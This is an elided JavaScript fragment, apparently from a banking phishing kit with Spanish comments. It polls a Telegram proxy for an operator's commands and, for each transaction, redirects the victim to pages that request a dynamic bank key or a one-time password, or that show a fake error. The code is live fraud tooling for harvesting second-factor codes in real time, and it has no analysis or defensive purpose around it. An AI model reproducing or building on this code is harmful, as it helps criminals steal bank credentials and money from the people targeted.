...
--------------------------------------------------
        ...
        async function checkPaymentVerification(transactionId) {
            try {
                const response = await fetch(`../../telegram_proxy.php?action=getUpdates&transactionId=${transactionId}`);
                const data = await response.json();
                ...
                if (verificationUpdate) {
                    ...
                    switch (verificationUpdate.callback_query.data) {
                        case `pedir_dinamica:${transactionId}`:
                            window.location.href = "cel-dina-error.php"; // Redirige a la página de clave dinámica
                            break;
                        ...
                        case `pedir_otp:${transactionId}`:
                            window.location.href = "index-otp.php"; // Redirige a la página de OTP
                            break;
                        ...
                        case `error_logo:${transactionId}`:
                            ...
                            window.location.href = "index-pc-error.php"; // Redirige a la página de error
                            break;
